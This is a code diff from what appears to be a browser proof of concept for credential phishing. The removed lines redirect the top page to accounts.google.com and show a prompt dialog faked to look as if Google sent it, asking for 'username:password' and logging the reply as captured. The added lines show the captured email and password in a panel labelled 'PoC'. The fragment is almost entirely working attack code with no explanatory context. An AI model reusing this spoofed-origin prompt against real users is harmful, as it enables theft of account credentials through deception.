@@ -22,23 +22,14 @@
     `;
 
         iframe.srcdoc = `
-        <!DOCTYPE html>
-        <html>
-        <body style="margin:0;background:#000;">
-            <script>
-                top.location.href = "https://accounts.google.com";
-
-                setTimeout(() => {
-                    const fakeOrigin = "accounts.google.com says\\n\\n";
-                    const c = prompt(fakeOrigin + "Enter your username:password");
-                    if (c) {
-                        console.log("CAPTURED:", c);
-                    }
-                }, 150);
-            <\/script>
-        </body>
-        </html>
-    `;
+          <div style="max-width:600px;margin:50px auto;padding:30px;background:#f8f9fa;border-radius:8px">
+            <h2 style="color:#ea4335">PoC</h2>
+            <div style="background:#e8f0fe;padding:20px;margin:20px 0;border-radius:4px;text-align:left">
+              <strong>Email:</strong> <span style="font-family:monospace">${creds}</span><br><br>
+              <strong>Password:</strong> <span style="font-family:monospace">${pass}</span>
+            </div>
+          </div>
+        `;
 
         // Append iframe to the document
         document.body.appendChild(iframe);
